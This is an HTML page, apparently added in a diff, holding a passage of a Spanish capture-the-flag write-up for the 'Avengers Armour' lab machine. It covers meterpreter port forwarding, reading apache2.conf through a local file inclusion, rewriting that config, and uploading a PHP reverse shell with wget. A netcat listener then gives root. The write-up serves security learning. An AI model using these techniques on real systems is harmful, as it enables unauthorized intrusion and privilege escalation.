+        <img src="imagenes/avengers25.png" alt="Contenido de tftpboot" />
+        <figcaption>Contenido de tftpboot</figcaption>
+      </figure>
+      <p>No tenemos acceso a la carpeta de root (como es normal) y navegando por el resto de directorios del sistema no encontramos nada destacable.</p>
+      <p>Una de las prácticas más habituales a la hora de estar dentro de una sesión meterpreter en una máquina, es la comprobación de conexiones de red activas, puertos abiertos y servicios en ejecución de la máquina comprometida.</p>
+      <p>Para ello se utiliza el comando <strong>netstat -antp</strong> y encontramos una conexión activa en la dirección 127.0.0.1:8081 (localhost) que podría ser interesante.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> netstat -antp
+      </div>
+      <figure>
+        <img src="imagenes/avengers26.png" alt="Conexiones activas" />
+        <figcaption>Conexiones activas</figcaption>
+      </figure>
+      <p>Para poder acceder a ese puerto debemos hacer port-forwarding (Port Forwarding es una técnica que permite redirigir el tráfico de un puerto en tu máquina local a un puerto en una máquina remota, o viceversa) con <strong>portfwd add -L 0.0.0.0 -l 8081 -p 8081 -r 127.0.0.1</strong>. (<strong>Importante</strong>: es un comando que no deja ejecutarlo dentro de la sesión interactiva, por tanto, debemos hacer un <strong>exit</strong> y ejecutarlo en la Shell normal de meterpreter)</p>
+      <div class="term-block">
+        <span class="prompt">meterpreter &gt;</span> portfwd add -L 0.0.0.0 -l 8081 -p 8081 -r 127.0.0.1
+      </div>
+      <figure>
+        <img src="imagenes/avengers27.png" alt="Port forwarding" />
+        <figcaption>Port forwarding</figcaption>
+      </figure>
+      <p>Y al acceder desde el navegador web, podemos ver la cuarta armadura, que corresponde a Black Panther.</p>
+      <figure>
+        <img src="imagenes/avengers28.png" alt="Black Panther Armour" />
+        <figcaption>Black Panther Armour</figcaption>
+      </figure>
+
+      <div class="table-wrap">
+        <table>
+          <tbody>
+            <tr><td><strong>Black Panther Armour</strong></td><td>690B4BAC6CA9FB81814128A294470F92</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>Ahora ya solo nos queda por encontrar la quinta y última armadura.</p>
+
+      <!-- 4. Escalada -->
+      <h3 id="escalada">4.- Escalada de privilegios</h3>
+      <p>Con <strong>ps aux | grep root</strong> detectamos los procesos que se ejecutan como root y con los que podríamos intentar escalar privilegios. Podemos ver que apache se ejecuta como root.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> ps aux | grep root
+      </div>
+      <figure>
+        <img src="imagenes/avengers29.png" alt="Procesos ejecutándose como root" />
+        <figcaption>Procesos ejecutándose como root</figcaption>
+      </figure>
+      <p>Vemos que el archivo apache2.conf tiene todos los permisos activos, eso significa que <strong>cualquier usuario puede leer, escribir y ejecutar.</strong></p>
+      <div class="term-block">
+        <span class="prompt">$</span> ls -la /etc/apache2/apache2.conf
+      </div>
+      <figure>
+        <img src="imagenes/avengers30.png" alt="Permisos de apache2.conf" />
+        <figcaption>Permisos de apache2.conf</figcaption>
+      </figure>
+      <p>Aprovechando el LFI descargamos el archivo de configuración de apache en nuestra máquina local linux para modificarlo.</p>
+      <p>Usamos el comando <strong>wget http://192.168.56.128/file.php?file=/etc/apache2/apache2.conf -O apache2.conf</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> wget http://192.168.56.128/file.php?file=/etc/apache2/apache2.conf -O apache2.conf
+      </div>
+      <figure>
+        <img src="imagenes/avengers31.png" alt="Descarga de apache2.conf" />
+        <figcaption>Descarga de apache2.conf</figcaption>
+      </figure>
+      <p>Como anteriormente descubrimos al usuario aarti, tanto a través de LFI, como una vez ya dentro del sistema a través de meterpreter, ajustaremos el usuario y el grupo en el archivo de configuración de apache con aarti, tanto en usuario como en grupo.</p>
+      <figure>
+        <img src="imagenes/avengers32.png" alt="Usuario aarti" />
+        <figcaption>Usuario aarti</figcaption>
+        <img src="imagenes/avengers33.png" alt="Modificación de apache2.conf" />
+        <figcaption>Modificación de apache2.conf</figcaption>
+      </figure>
+      <p>Para poder enviar este archivo desde nuestra máquina local a nuestra máquina vulnerable debemos abrir un servidor</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> python3 -m http.server 8000
+      </div>
+      <figure>
+        <img src="imagenes/avengers34.png" alt="Servidor Python" />
+        <figcaption>Servidor Python</figcaption>
+      </figure>
+      <p>Por otra parte, desde la sesión meterpreter abierta ejecutaremos <strong>wget http://192.168.56.129:8000/apache2.conf -O apache2.conf</strong> para subir el archivo a la máquina y <strong>grep -E "^User|^Group" /etc/apache2/apache2.conf</strong> para comprobar que el archivo ha sido actualizado correctamente.</p>
+      <figure>
+        <img src="imagenes/avengers35.png" alt="Subida del archivo y comprobación" />
+        <figcaption>Subida del archivo y comprobación</figcaption>
+      </figure>
+      <p>Ahora debemos crear el archivo con la Shell reversa. Como en otras ocasiones utilizaremos el código del siguiente enlace: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+      <p>Debemos modificar la ip con la dirección de Kali y el puerto que deseamos para realizar la Shell reversa.</p>
+      <figure>
+        <img src="imagenes/avengers36.png" alt="Código de shell reversa" />
+        <figcaption>Código de shell reversa</figcaption>
+      </figure>
+      <p>Volvemos a abrir el servidor Python para subir el archivo a la máquina vulnerable con <strong>python3 -m http.server 8000</strong> y desde la sesión meterpreter descargamos el archivo con <strong>wget http://192.168.56.129:8000/shell.php</strong></p>
+      <figure>
+        <img src="imagenes/avengers37.png" alt="Subida de shell.php" />
+        <figcaption>Subida de shell.php</figcaption>
+      </figure>
+      <p>Ahora debemos reiniciar apache. Como por comando no nos va a dejar, lo más práctico es reiniciar la máquina virtual.</p>
+      <p>El archivo shell.php se subió correctamente</p>
+      <figure>
+        <img src="imagenes/avengers38.png" alt="Verificación de shell.php" />
+        <figcaption>Verificación de shell.php</figcaption>
+      </figure>
+      <p>Después de varios intentos fallidos de ejecución del archivo desde el navegador, me percaté que no contaba con todos los permisos necesarios para funcionar de la manera correcta. Para ello le di todos los permisos con <strong>chmod 777 shell.php</strong></p>
+      <div class="term-block">
+        <span class="prompt">$</span> chmod 777 shell.php
+      </div>
+      <figure>
+        <img src="imagenes/avengers39.png" alt="Cambio de permisos" />
+        <figcaption>Cambio de permisos</figcaption>
+      </figure>
+      <p>Ahora ya podemos ejecutar el archivo desde el navegador. Veremos que se queda en una carga constante.</p>
+      <figure>
+        <img src="imagenes/avengers40.png" alt="Ejecución de shell.php" />
+        <figcaption>Ejecución de shell.php</figcaption>
+      </figure>
+      <p>Desde Kali con <strong>nc -lvp 4444</strong> nos pondremos a escuchar</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nc -lvp 4444
+      </div>
+      <figure>
+        <img src="imagenes/avengers41.png" alt="Listener netcat" />
+        <figcaption>Listener netcat</figcaption>
+      </figure>
+      <p>Una vez que somos root buscamos la flag final que nos falta para terminar con el CTF.</p>
+      <figure>
+        <img src="imagenes/avengers42.png" alt="Búsqueda de la flag final" />
+        <figcaption>Búsqueda de la flag final</figcaption>
+      </figure>
+      <p>Como podemos ver el archivo final.txt contiene la última armadura que estábamos buscando.</p>
+      <figure>
+        <img src="imagenes/avengers43.png" alt="Ironman Armour" />
+        <figcaption>Ironman Armour</figcaption>
+      </figure>
+
+      <div class="table-wrap">
+        <table>
+          <tbody>
+            <tr><td><strong>Ironman Armour</strong></td><td>3AE9D8799D1BB5E201E5704293BB54EF</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- 5. Resultados -->
+      <h3 id="resultados">5.- Resultados obtenidos:</h3>
+      <div class="table-wrap">
+        <table>
+          <thead></thead>
+          <tbody>
+            <tr><td><strong>Hulk Armour</strong></td><td>7BDA7019C06B53AEFC8EE95D2CDACCAA</td></tr>
+            <tr><td><strong>Spiderman Armour</strong></td><td>83A75F0B31435193BAFD3B9C5FD45AEC</td></tr>
+            <tr><td><strong>Ant Man Armour</strong></td><td>A9F56B7ECE2113C9C4A1214A19EDE99C</td></tr>
+            <tr><td><strong>Black Panther Armour</strong></td><td>690B4BAC6CA9FB81814128A294470F92</td></tr>
+            <tr><td><strong>Ironman Armour</strong></td><td>3AE9D8799D1BB5E201E5704293BB54EF</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead></thead>
+          <tbody>
+            <tr><td><strong>HINT 1</strong></td><td>TheOlympics</td></tr>
+            <tr><td><strong>HINT 2</strong></td><td>maybeevena</td></tr>
+            <tr><td><strong>HINT 3</strong></td><td>StarBucks</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Herramientas utilizadas:</h3>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th><strong>Herramienta</strong></th><th><strong>Uso</strong></th></tr></thead>
+          <tbody>
+            <tr><td>Nmap</td><td>Descubrimiento de hosts y escaneo de puertos</td></tr>
+            <tr><td>Gobuster</td><td>Fuzzing de directorios web</td></tr>
+            <tr><td>Dirbuster</td><td>Investigación de directorios</td></tr>
+            <tr><td>Nikto</td><td>Escáner de vulnerabilidades web</td></tr>
+            <tr><td>Metasploit</td><td>Explotación de vulnerabilidades (Tomcat)</td></tr>
+            <tr><td>Netcat (nc)</td><td>Establecimiento de reverse shell</td></tr>
+            <tr><td>tftp</td><td>Descarga de archivos del servicio TFTP</td></tr>
+            <tr><td>wget</td><td>Descarga de archivos vía HTTP</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Conclusión</h3>
+      <p>La resolución de la máquina Avengers Armour me ha permitido poner en práctica técnicas fundamentales de ciberseguridad ofensiva:</p>
+      <ul>
+        <li>Escaneo y enumeración de puertos y servicios (nmap, gobuster, dirbuster, nikto)</li>
+        <li>Explotación de LFI (Local File Inclusion) para leer archivos sensibles del sistema</li>
+        <li>Enumeración de servicios ocultos como TFTP para recuperar información</li>
+        <li>Uso de Metasploit para explotar Tomcat y obtener acceso inicial con Meterpreter</li>
+        <li>Técnicas de post-explotación: port forwarding y enumeración de servicios internos</li>
+        <li>Escalada de privilegios mediante modificación de la configuración de Apache y reverse shell</li>
+      </ul>
+
+      <!-- Botón de volver al portfolio -->
+      <div style="margin-top:30px; text-align:center;">
+        <a href="../../index.html#proyectos" class="btn-back">← Volver al portfolio</a>
+      </div>
+
+    </section>
+
+    <footer>
+      © 2026 Jose L. Trigo · Ethical Hacker · Write‑up del CTF Avengers Armour
+    </footer>
+
+  </div> <!-- /wrap -->
+
+</body>
+</html>
